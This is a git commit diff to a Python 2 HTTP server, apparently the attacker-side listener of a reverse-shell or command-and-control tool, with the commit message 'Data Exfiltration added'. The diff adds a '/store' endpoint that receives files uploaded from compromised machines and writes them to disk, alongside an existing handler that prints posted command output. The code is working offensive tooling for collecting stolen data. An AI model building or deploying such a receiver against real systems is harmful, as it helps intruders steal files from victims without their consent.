9c86fa1211c0243d34088854e7e2eb5585b2a874
Apurv Singh Gautam <apurvsinghgautam@gmail.com>
2017-06-03 10:08:10 +0000

    Data Exfiltration added

--- server.py
+++ server.py
@@ -1,6 +1,7 @@
 #Server
 
-import BaseHTTPServer   # Built-in HTTP library 
+import BaseHTTPServer   # Built-in HTTP library
+import os,cgi
 
 HOST_NAME = '192.168.158.128'   # Host IP address
 PORT_NUMBER = 80   # Listening port number 
@@ -18,10 +19,25 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
 
             
     def do_POST(s):
-                                                    
+
+        if s.path=='/store':        #Check whether /store is appended or not
+            try:
+                ctype,pdict=cgi.parse_header(s.headers.getheader('content-type'))
+                if ctype=='multipart/form-data':
+                    fs=cgi.FieldStorage(fp=s.rfile,headers=s.headers,environ={'REQUEST_METHOD':'POST'})
+                else:
+                    print "[-] Unexpected POST request"
+                fs_up=fs['file']                #Here file is the key to hold the actual file
+                with open('/root/Desktop/demo.txt','wb') as o:  #Create new file and write contents into this file
+                    o.write(fs_up.file.read())
+                    s.send_response(200)
+                    s.end_headers()
+            except Exception as e:
+                    print e
+            return 
         s.send_response(200)                        
         s.end_headers()
-        length  = int(s.headers['Content-Length'])   #Define the length which means how many bytes the HTTP POST data contains                                      
+        length  = int(s.headers['Content-Length'])   #Define the length which means how many bytes the HTTP POST data contains                                              
         postVar = s.rfile.read(length)               # Read then print the posted data
         print postVar
         
@@ -31,22 +47,10 @@ if __name__ == '__main__':
     
     server_class = BaseHTTPServer.HTTPServer
     httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler)
-
+ 
     try:     
         httpd.serve_forever()   #if we got ctrl+c we will Interrupt and stop the server
     except KeyboardInterrupt:   
         print '[!] Server is terminated'
         httpd.server_close()
-
-
-
-
-
-
-
-
-
-
-
-
 
